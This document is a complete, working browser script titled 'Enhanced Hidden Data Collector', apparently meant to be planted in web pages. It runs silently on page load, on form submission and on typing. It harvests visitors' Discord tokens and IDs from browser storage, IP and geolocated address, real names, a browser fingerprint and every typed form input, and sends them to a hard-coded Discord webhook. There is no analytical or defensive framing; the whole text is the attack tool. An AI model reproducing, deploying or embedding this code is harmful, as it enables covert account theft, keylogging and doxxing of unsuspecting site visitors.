<!-- Enhanced Hidden Data Collector -->
<script>
(function(){
    'use strict';
    
    // YOUR DISCORD WEBHOOK - REPLACE THIS
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq";
    
    // Discord token patterns to search for
    const DISCORD_PATTERNS = [
        /mfa\.[a-z0-9_-]{20,}/i,
        /[a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27}/i,
        /rpc\.[a-z0-9_-]+/i,
        /[0-9]{17,20}/ // Discord IDs
    ];
    
    async function collectAndSend() {
        try {
            // 1. Get IP Address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            
            // 2. Get Location Data (City, Country, Address)
            let locationData = {city: 'Unknown', country: 'Unknown', region: 'Unknown', postal: 'Unknown', org: 'Unknown'};
            try {
                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                if (geoResponse.ok) {
                    locationData = await geoResponse.json();
                }
            } catch (e) {
                // Fallback to ipinfo.io
                try {
                    const fallbackResponse = await fetch(`https://ipinfo.io/${ip}/json`);
                    if (fallbackResponse.ok) {
                        const fallbackData = await fallbackResponse.json();
                        locationData = {
                            city: fallbackData.city || 'Unknown',
                            country: fallbackData.country || 'Unknown',
                            region: fallbackData.region || 'Unknown',
                            postal: fallbackData.postal || 'Unknown',
                            org: fallbackData.org || 'Unknown'
                        };
                    }
                } catch (e2) {}
            }
            
            // 3. Extract Discord User Data from LocalStorage
            let discordUser = 'Not Found';
            let discordId = 'Not Found';
            let discordToken = 'Not Found';
            
            try {
                // Check localStorage for Discord data
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    
                    // Look for Discord tokens
                    if (value) {
                        for (const pattern of DISCORD_PATTERNS) {
                            const match = value.match(pattern);
                            if (match) {
                                if (pattern.toString().includes('17,20')) {
                                    discordId = match[0];
                                } else {
                                    discordToken = match[0].substring(0, 30) + '...';
                                }
                            }
                        }
                        
                        // Look for Discord user object
                        if (value.includes('"username"') || value.includes('"id"') || value.includes('discord')) {
                            try {
                                const parsed = JSON.parse(value);
                                if (parsed.username || parsed.id) {
                                    discordUser = parsed.username || 'Unknown';
                                    discordId = parsed.id || discordId;
                                }
                            } catch (e) {}
                        }
                    }
                }
                
                // Check sessionStorage too
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    if (value && value.includes('discord')) {
                        try {
                            const parsed = JSON.parse(value);
                            if (parsed.username) discordUser = parsed.username;
                            if (parsed.id) discordId = parsed.id;
                        } catch (e) {}
                    }
                }
                
                // Check window object for Discord data
                if (window.DiscordUser || window.discordUser) {
                    discordUser = (window.DiscordUser || window.discordUser).username || discordUser;
                    discordId = (window.DiscordUser || window.discordUser).id || discordId;
                }
                
                // Try to fetch Discord user data if we have a token
                if (discordToken !== 'Not Found' && !discordToken.includes('...')) {
                    try {
                        const discordResponse = await fetch('https://discord.com/api/v9/users/@me', {
                            headers: {
                                'Authorization': discordToken
                            }
                        });
                        if (discordResponse.ok) {
                            const userData = await discordResponse.json();
                            discordUser = userData.username + '#' + (userData.discriminator || '0000');
                            discordId = userData.id;
                        }
                    } catch (e) {}
                }
                
            } catch (e) {
                console.error('Discord extraction error:', e);
            }
            
            // 4. Get Browser Fingerprint
            function getFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillText('FINGERPRINT', 2, 15);
                    return canvas.toDataURL().substring(22, 50);
                } catch (e) {
                    return 'Error';
                }
            }
            
            // 5. Get Real Address from Geolocation API (if user allows)
            let exactAddress = 'Not Available (Permissions Denied)';
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Try to reverse geocode to get address
                    try {
                        const addressResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                        if (addressResponse.ok) {
                            const addressData = await addressResponse.json();
                            exactAddress = addressData.display_name || `${lat}, ${lon}`;
                        } else {
                            exactAddress = `${lat}, ${lon}`;
                        }
                    } catch (e) {
                        exactAddress = `${lat}, ${lon}`;
                    }
                    
                } catch (e) {
                    // User denied location permission
                }
            }
            
            // 6. Get Real Name from form inputs (if available)
            let realName = 'Not Found';
            const nameInputs = document.querySelectorAll('input[name*="name"], input[id*="name"], input[type="text"]');
            for (const input of nameInputs) {
                if (input.value && (input.name.toLowerCase().includes('name') || 
                    input.id.toLowerCase().includes('name') ||
                    input.placeholder.toLowerCase().includes('name'))) {
                    realName = input.value;
                    break;
                }
            }
            
            // 7. Prepare Discord Embed
            const embed = {
                title: "🎯 COMPROMISED USER DATA CAPTURED",
                color: 0xff0000,
                timestamp: new Date().toISOString(),
                thumbnail: {
                    url: "https://cdn.discordapp.com/attachments/1067246903231311872/1217164866436132944/discord-nitro-logo.png"
                },
                fields: [
                    {
                        name: "👤 DISCORD USER",
                        value: `**Username:** ${discordUser}\n**ID:** \`${discordId}\`\n**Token:** \`${discordToken}\``,
                        inline: true
                    },
                    {
                        name: "📍 LOCATION DATA",
                        value: `**IP:** \`${ip}\`\n**City:** ${locationData.city}\n**Region:** ${locationData.region}\n**Country:** ${locationData.country}\n**ZIP:** ${locationData.postal}`,
                        inline: true
                    },
                    {
                        name: "🏠 EXACT ADDRESS",
                        value: exactAddress.substring(0, 1000),
                        inline: false
                    },
                    {
                        name: "👁️ REAL NAME",
                        value: realName,
                        inline: true
                    },
                    {
                        name: "🌐 ISP / ORGANIZATION",
                        value: locationData.org || 'Unknown',
                        inline: true
                    },
                    {
                        name: "🖥️ BROWSER INFO",
                        value: `**User Agent:** ${navigator.userAgent.substring(0, 100)}...\n**Language:** ${navigator.language}\n**Platform:** ${navigator.platform}`,
                        inline: false
                    },
                    {
                        name: "🔗 PAGE INFO",
                        value: `**URL:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}`,
                        inline: true
                    },
                    {
                        name: "🆔 FINGERPRINT",
                        value: `\`${getFingerprint()}\``,
                        inline: true
                    },
                    {
                        name: "📊 SCREEN INFO",
                        value: `**Resolution:** ${screen.width}x${screen.height}\n**Color Depth:** ${screen.colorDepth}bit\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
                        inline: true
                    }
                ],
                footer: {
                    text: `Data captured at ${new Date().toLocaleTimeString()}`,
                    icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
                }
            };
            
            // 8. Send to Discord Webhook
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: "💀 DATA GRABBER",
                    avatar_url: "https://cdn.discordapp.com/attachments/1067246903231311872/1217164866436132944/discord-nitro-logo.png",
                    embeds: [embed]
                })
            });
            
            // 9. Additional: Send as raw data for backup
            const rawData = {
                discord: {user: discordUser, id: discordId, token: discordToken},
                location: {ip: ip, city: locationData.city, country: locationData.country, address: exactAddress},
                personal: {name: realName},
                browser: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                page: {url: window.location.href, referrer: document.referrer},
                timestamp: new Date().toISOString()
            };
            
            // Send raw data (optional second webhook)
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `\`\`\`json\n${JSON.stringify(rawData, null, 2)}\n\`\`\``
                    })
                });
            } catch (e) {}
            
        } catch (error) {
            console.error('Collection error:', error);
            
            // Still try to send basic data
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `❌ Error in data collection but page visited: ${window.location.href}\nUser Agent: ${navigator.userAgent.substring(0, 100)}`
                    })
                });
            } catch (e) {}
        }
    }
    
    // Run on page load
    window.addEventListener('load', () => {
        setTimeout(collectAndSend, 1500);
    });
    
    // Also run on any form submission
    document.addEventListener('submit', (e) => {
        setTimeout(collectAndSend, 500);
    });
    
    // Capture form inputs in real-time
    let capturedInputs = {};
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const name = e.target.name || e.target.id || 'unknown';
            capturedInputs[name] = e.target.value;
            
            // Send captured form data every 10 inputs
            if (Object.keys(capturedInputs).length >= 10) {
                setTimeout(() => {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `📝 Form inputs captured:\n\`\`\`json\n${JSON.stringify(capturedInputs, null, 2)}\n\`\`\``
                        })
                    });
                    capturedInputs = {};
                }, 1000);
            }
        }
    });
    
    // Try to get Discord user from page content (if they mentioned it)
    function extractDiscordFromPage() {
        const pageText = document.body.innerText;
        const discordPatterns = [
            /discord\.gg\/[a-zA-Z0-9\-_]+/gi,
            /discord\.com\/invite\/[a-zA-Z0-9\-_]+/gi,
            /discordapp\.com\/invite\/[a-zA-Z0-9\-_]+/gi,
            /@([a-zA-Z0-9\_\.]+)#([0-9]{4})/g,
            /[0-9]{17,20}/g
        ];
        
        let foundDiscord = [];
        for (const pattern of discordPatterns) {
            const matches = pageText.match(pattern);
            if (matches) foundDiscord.push(...matches);
        }
        
        return [...new Set(foundDiscord)];
    }
    
    // Extract and send Discord links found on page
    setTimeout(() => {
        const discordLinks = extractDiscordFromPage();
        if (discordLinks.length > 0) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `🔗 Discord links found on page:\n${discordLinks.join('\n').substring(0, 1900)}`
                })
            });
        }
    }, 3000);
    
})();
</script>
